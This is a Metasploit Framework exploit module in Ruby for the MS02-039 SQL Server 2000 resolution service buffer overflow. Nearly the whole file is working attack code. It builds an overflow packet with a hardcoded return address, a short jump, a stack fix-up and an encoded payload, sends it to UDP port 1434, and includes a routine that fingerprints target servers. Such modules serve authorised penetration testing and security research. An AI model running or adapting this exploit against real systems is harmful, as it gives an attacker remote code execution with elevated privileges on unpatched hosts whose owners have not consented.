##
# $Id: ms02_039_slammer.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::MSSQL

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft SQL Server Resolution Overflow',
			'Description'    => %q{
					This is an exploit for the SQL Server 2000 resolution
				service buffer overflow. This overflow is triggered by
				sending a udp packet to port 1434 which starts with 0x04 and
				is followed by long string terminating with a colon and a
				number. This module should work against any vulnerable SQL
				Server 2000 or MSDE install (pre-SP3).

			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2002-0649'],
					[ 'OSVDB', '4578'],
					[ 'BID', '5310'],
					[ 'MSB', 'MS02-039'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "\x00\x3a\x0a\x0d\x2f\x5c",
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					[
						'MSSQL 2000 / MSDE <= SP2',
						{
							'Platform' => 'win',
							'Ret'      => 0x42b48774,
						},
					],
				],
			'Platform'       => 'win',
			'DisclosureDate' => 'Jul 24 2002',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(1434)
			], self.class)
	end


	def check
		info = mssql_ping
		if (info['ServerName'])
			print_status("SQL Server Information:")
			info.each_pair { |k,v|
				print_status("   #{k + (" " * (15-k.length))} = #{v}")
			}
			return Exploit::CheckCode::Detected
		end
		return Exploit::CheckCode::Safe
	end

	def exploit

		connect_udp
		print_status(sprintf("Sending UDP packet with return address 0x%.8x", target.ret))
		print_status("Execute 'net start sqlserveragent' once access is obtained");

		# \x68:888 => push dword 0x3838383a
		buf = "\x04" + rand_text_english(800, payload_badchars) + "\x68:888"

		# Return to the stack pointer
		buf[ 97, 4] = [target.ret].pack('V')

		# Which lands right here
		buf[101, 6] = make_nops(6)

		# Jumps 8 bytes ahead
		buf[107, 2] = "\xeb\x08"

		# Write to thread storage space to avoid a crash
		buf[109, 8] = [0x7ffde0cc, 0x7ffde0cc].pack('VV')

		# And finally into the payload
		buf[117,payload.encoded.length] = payload.encoded

		udp_sock.put(buf)

		disconnect_udp
		handler
	end

end